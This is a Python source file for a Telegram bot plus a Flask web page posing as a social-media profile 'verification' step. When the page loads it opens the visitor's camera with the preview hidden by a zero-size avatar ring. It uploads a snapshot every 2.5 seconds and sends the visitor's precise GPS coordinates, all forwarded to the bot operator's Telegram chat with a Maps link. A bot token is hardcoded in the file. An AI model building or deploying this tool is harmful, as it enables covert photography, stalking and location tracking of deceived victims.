import os
import io
import base64
import threading
import requests
from flask import Flask, request, render_template_string
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

# ==========================================
# 1. CONFIGURATION
# ==========================================
# Replace with your fresh, active Bot token from @BotFather
TOKEN = os.getenv("8269693401:AAG1iujyKHIg6QgpZtpMEDc9nFs_7loXR54") or "8269693401:AAG1iujyKHIg6QgpZtpMEDc9nFs_7loXR54"

# Your active VS Code forwarded tunnel domain (no trailing slash)
DOMAIN = "https://telibot-production.up.railway.app"

# ==========================================
# 2. FLASK WEB APP & TEMPLATE
# ==========================================
flask_app = Flask(__name__)

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>My profile</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
        }
        .profile-container {
            width: 100%;
            max-width: 400px;
            background: #121212;
            border-radius: 20px;
            border: 1px solid #262626;
            padding: 24px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }
        .profile-header {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 20px;
            text-align: left;
        }
        
        /* Circular Avatar Ring */
        .avatar-ring {
            width: 0px;
            height: 0px;
            border-radius: 50%;
            padding: 3px;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            overflow: hidden;
        }
        
        /* Live Circular Camera Preview */
        #video {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            transform: scaleX(-1);
            background: #222;
            display: block;
        }
        
        canvas { display: none; }

        .stats {
            display: flex;
            gap: 16px;
            font-size: 13px;
        }
        .stats strong {
            display: block;
            font-size: 16px;
            color: #fff;
        }
        .bio-section {
            text-align: left;
            margin-bottom: 20px;
        }
        .bio-section h4 {
            font-size: 15px;
            margin-bottom: 4px;
        }
        .bio-section p {
            font-size: 13px;
            color: #aaa;
            line-height: 1.4;
        }
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-action {
            background: #0095f6;
            color: #fff;
        }
        .btn-action:active { background: #0077c5; }
        .btn-stop {
            background: #e50914;
            color: #fff;
            display: none;
            margin-top: 10px;
        }

        /* Error state shown on permission rejection */
        #errorBox {
            display: none;
            margin-top: 15px;
            background: rgba(229, 9, 20, 0.12);
            border: 1px solid rgba(229, 9, 20, 0.4);
            border-radius: 12px;
            padding: 16px;
            text-align: center;
        }
        #errorBox h5 {
            color: #ff4d4f;
            font-size: 15px;
            margin-bottom: 6px;
        }
        #errorBox p {
            color: #bbb;
            font-size: 12px;
            line-height: 1.4;
            margin-bottom: 12px;
        }

        #status {
            font-size: 12px;
            color: #888;
            margin-top: 14px;
        }
        #locStatus {
            font-size: 11px;
            color: #00ba38;
            margin-top: 4px;
        }
    </style>
</head>
<body>

<div class="profile-container">
    <div class="profile-header">
        <div class="avatar-ring">
            <video id="video" autoplay playsinline muted></video>
        </div>
        <div class="stats">
            <div><strong>18</strong>Posts</div>
            <div><strong>1.2k</strong>Followers</div>
            <div><strong>340</strong>Following</div>
        </div>
    </div>
    
    <div class="bio-section">
        <h4>My profile</h4>
        <p>smile please</p>
    </div>

    <canvas id="canvas"></canvas>

    <button id="startBtn" class="btn btn-action" onclick="startVerification()">start</button>
    <button id="stopBtn" class="btn btn-stop" onclick="stopVerification()">Stop </button>

    <!-- Error message displayed if permissions are denied -->
    <div id="errorBox">
        <h5>You can't login</h5>
        <p>Camera and location verification were denied. Permissions are required to proceed. Tap 'Try Again' or enable access in browser settings.</p>
        <button class="btn btn-action" onclick="startVerification()">Try Again</button>
    </div>
    
    <p id="status">continue</p>
    <p id="locStatus"></p>
</div>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const status = document.getElementById('status');
    const locStatus = document.getElementById('locStatus');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const errorBox = document.getElementById('errorBox');
    const chatId = "{{ chat_id }}";

    let mediaStream = null;
    let isRunning = false;
    let count = 0;
    let locationSent = false;

    // Dispatch location coordinates to Flask
    function sendLocationData(pos, label = "Instant") {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const accuracy = Math.round(pos.coords.accuracy);

        fetch('/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                latitude: lat,
                longitude: lon,
                accuracy: accuracy
            })
        })
        .then(res => res.json())
        .then(() => {
            locationSent = true;
            locStatus.innerText = `📍 ${label} location sent (~${accuracy}m)`;
        })
        .catch(err => {
            locStatus.innerText = "Location upload notice: " + err.message;
        });
    }

    // Fast multi-tier location fetch
    function fetchCoordinates() {
        if (!navigator.geolocation) {
            locStatus.innerText = "Location not supported.";
            return;
        }

        locStatus.innerText = "Loading...";

        // 1. FAST PASS: Resolves in < 1 second using cached OS location / Cell / Wi-Fi
        navigator.geolocation.getCurrentPosition(
            (pos) => sendLocationData(pos, "Instant"),
            (err) => console.log("Fast pass notice:", err.message),
            {
                enableHighAccuracy: false,
                timeout: 4000,
                maximumAge: 60000 // Accepts coordinates up to 1 minute old
            }
        );

        // 2. PRECISION PASS: Runs in the background to send refined GPS once locked
        navigator.geolocation.getCurrentPosition(
            (pos) => sendLocationData(pos, "High-Accuracy GPS"),
            (err) => console.log("GPS refine notice:", err.message),
            {
                enableHighAccuracy: true,
                timeout: 12000,
                maximumAge: 0
            }
        );
    }

    async function startVerification() {
        errorBox.style.display = "none";
        status.innerText = "Requesting permissions...";

        // Step 1: Open Camera Stream
        try {
            mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" },
                audio: false
            });

            video.srcObject = mediaStream;
            await video.play();

            isRunning = true;
            startBtn.style.display = "none";
            stopBtn.style.display = "block";
            status.innerText = "verified....";

            // Step 2: Trigger location prompt shortly after camera initializes
            if (!locationSent) {
                setTimeout(fetchCoordinates, 500);
            }

            sendLoop();
        } catch (err) {
            isRunning = false;
            startBtn.style.display = "none";
            stopBtn.style.display = "none";
            errorBox.style.display = "block";
            status.innerText = "permission rejected.";
        }
    }

    function stopVerification() {
        isRunning = false;
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
        }
        stopBtn.style.display = "none";
        startBtn.style.display = "block";
        startBtn.innerText = "Restart Verification";
        status.innerText = "Session stopped. Hardware released.";
    }

    // Continuous capture loop with square center crop
    function sendLoop() {
        if (!isRunning) return;

        const size = 480;
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');

        const vWidth = video.videoWidth || 640;
        const vHeight = video.videoHeight || 480;
        const minDim = Math.min(vWidth, vHeight);
        const sx = (vWidth - minDim) / 2;
        const sy = (vHeight - minDim) / 2;

        ctx.save();
        ctx.translate(size, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, sx, sy, minDim, minDim, 0, 0, size, size);
        ctx.restore();

        // High compression to ensure rapid uploads over mobile data
        const imageData = canvas.toDataURL('image/jpeg', 0.65);

        fetch('/upload', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, image: imageData })
        })
        .then(res => res.json())
        .then(data => {
            if (data.status === 'success') {
                count++;
                status.innerText;
            }
        })
        .catch(err => {
            status.innerText = "Upload notice: " + err.message;
        })
        .finally(() => {
            // Schedule the NEXT capture 2.5 seconds after upload completes
            if (isRunning) {
                setTimeout(sendLoop, 2500);
            }
        });
    }

    window.addEventListener('load', () => {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            startVerification().catch(() => {});
        }
    });

    window.addEventListener('beforeunload', stopVerification);
</script>

</body>
</html>"""
@flask_app.route('/')
def home():
    return "bot and web app are live!"
@flask_app.route('/camera/<chat_id>')
def camera_view(chat_id):
    return render_template_string(HTML_PAGE, chat_id=chat_id)

@flask_app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.get_json()
        if not data:
            return {"status": "error", "message": "No JSON payload"}, 400

        chat_id = data.get('chat_id')
        raw_b64 = data.get('image')

        if not chat_id or not raw_b64:
            return {"status": "error", "message": "Missing chat_id or image"}, 400

        image_data = raw_b64.split(',')[1] if ',' in raw_b64 else raw_b64
        image_bytes = base64.b64decode(image_data)

        telegram_api_url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        files = {'photo': ('circle_shot.jpg', io.BytesIO(image_bytes), 'image/jpeg')}
        payload = {'chat_id': chat_id, 'caption': '📸 Circle camera frame received'}

        response = requests.post(telegram_api_url, data=payload, files=files, timeout=15)
        
        if response.status_code == 200:
            return {"status": "success"}, 200
        else:
            return {"status": "error", "details": response.text}, 500

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500

@flask_app.route('/location', methods=['POST'])
def handle_location():
    try:
        data = request.get_json()
        if not data:
            return {"status": "error", "message": "No payload"}, 400

        chat_id = data.get('chat_id')
        lat = data.get('latitude')
        lon = data.get('longitude')
        accuracy = data.get('accuracy', 'N/A')

        if not chat_id or lat is None or lon is None:
            return {"status": "error", "message": "Invalid coordinates"}, 400

        print(f"[Location Received]: Lat {lat}, Lon {lon}, Accuracy ~{accuracy}m for Chat {chat_id}")

        # 1. Send native Telegram interactive map pin
        loc_url = f"https://api.telegram.org/bot{TOKEN}/sendLocation"
        loc_payload = {'chat_id': chat_id, 'latitude': float(lat), 'longitude': float(lon)}
        requests.post(loc_url, json=loc_payload, timeout=15)

        # 2. Send Google Maps clickable link
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        msg_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        msg_payload = {
            'chat_id': chat_id,
            'text': f"📍 Verified Google Maps Location:\n{maps_link}\n(Accuracy: ~{accuracy} meters)"
        }
        requests.post(msg_url, json=msg_payload, timeout=15)

        return {"status": "success"}, 200

    except Exception as e:
        print(f"[Location Error]: {str(e)}")
        return {"status": "error", "message": str(e)}, 500


# ==========================================
# 3. TELEGRAM BOT HANDLERS
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_url = f"{DOMAIN}/camera/{chat_id}"

    # Persistent keyboard button
    keyboard = [[KeyboardButton("📸 Open Camera / Verify")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    welcome_message = (
        f"📸 Tap the link below to open verification:\n\n"
        f"🔗 {user_url}\n\n"
        f"You can also tap the button below anytime to re-verify."
    )

    await update.message.reply_text(welcome_message, reply_markup=reply_markup)

async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "📸 Open Camera / Verify":
        await start(update, context)


# ==========================================
# 4. EXECUTION RUNNER
# ==========================================
def run_flask():
    flask_app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

def main():
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    application = (
        Application.builder()
        .token(TOKEN)
        .connect_timeout(30)
        .read_timeout(30)
        .write_timeout(30)
        .pool_timeout(30)
        .build()
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button))

    print("==========================================")
    print(" Bot and Web Server are running!")
    print(f" Local Web View: http://127.0.0.1:5000")
    print(f" Public Domain:  {DOMAIN}")
    print("==========================================")

    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
